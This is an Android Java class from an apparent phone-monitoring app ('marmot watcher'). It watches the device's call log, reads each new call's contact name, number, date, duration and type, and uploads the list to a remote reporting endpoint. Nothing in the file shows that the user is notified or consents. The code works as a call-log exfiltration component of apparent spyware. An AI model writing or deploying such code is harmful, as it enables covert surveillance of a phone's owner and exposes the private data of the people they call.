/**
 * 
 */
package com.domker.marmot.watcher.sms;

import java.util.ArrayList;
import java.util.List;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.Handler;
import android.provider.CallLog;

import com.android.volley.Response.Listener;
import com.domker.marmot.config.ConfigManager;
import com.domker.marmot.log.MLog;
import com.domker.marmot.net.ResponseResult;
import com.domker.marmot.net.Urls;
import com.domker.marmot.net.WatcherNet;
import com.domker.marmot.net.WatcherRequest;
import com.domker.marmot.watcher.WatcherContentObserver;

/**
 * 通话记录检测
 * 
 * @author wanlipeng
 * @date 2017年1月3日 下午5:26:16
 */
public class CallObserver extends WatcherContentObserver {
	private ConfigManager configManager = null;
	
	/**
	 * @param handler
	 */
	public CallObserver(Context context, Handler handler) {
		super(context, handler);
		configManager = ConfigManager.getInstance();
	}

	@Override
	public void onChange(boolean selfChange) {
		super.onChange(selfChange);
		updateCallHistory();
	}

	/* (non-Javadoc)
	 * @see com.domker.marmot.watcher.WatcherContentObserver#checkChange()
	 */
	@Override
	public void checkChange() {
		updateCallHistory();
	}
	
	/**
	 * 更新通话列表
	 * 
	 * @return 可能返回null或者空的list
	 */
	private void updateCallHistory() {
		List<CallEntity> callsList = new ArrayList<CallEntity>();
		ContentResolver cr = mContext.getContentResolver();
		String where = " date > " + configManager.getCallTimeline();
		String sortOrder = CallLog.Calls.DEFAULT_SORT_ORDER;
		Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, where, null, sortOrder);
		if (cursor == null || cursor.getCount() <= 0) {
			return;
		}
		MLog.i("Begin UpdateCallHistory");
		while (cursor.moveToNext()) {
			CallEntity call = parserCall(cursor);
			callsList.add(call);
		}
		MLog.i("End UpdateCallHistory");
		cursor.close();
		postRequest(callsList);
	}
	
	/**
	 * 解析成实体类
	 * 
	 * @param c
	 * @return
	 */
	private CallEntity parserCall(Cursor c) {
		CallEntity call = new CallEntity();
		/* Reading Name */
		call.name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));
		/* Reading Date */
		call.date = c.getLong(c.getColumnIndex(CallLog.Calls.DATE));
		/* Reading duration */
		call.duration = c.getLong(c.getColumnIndex(CallLog.Calls.DURATION));
		/* Reading Date */
		call.type = c.getInt(c.getColumnIndex(CallLog.Calls.TYPE));
		call.phoneNumber = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
		call.uid = configManager.getUid();
		MLog.i("CallEntity", call.toString());
		return call;
	}
	
	private void postRequest(List<CallEntity> callsList) {
		if (callsList == null || callsList.isEmpty()) {
			return;
		}
		
		Listener<ResponseResult> listener = new Listener<ResponseResult>() {

			@Override
			public void onResponse(ResponseResult result) {
				MLog.i("onResponse", result.toString());
				if (result.isSucceed()) {
					configManager.setCallTimeline(System.currentTimeMillis());
				}
			}
		};
		WatcherRequest request = WatcherRequest.create(Urls.CALL_REPORT, callsList, listener);
		WatcherNet.getInstance().addRequest(request);
	}
}
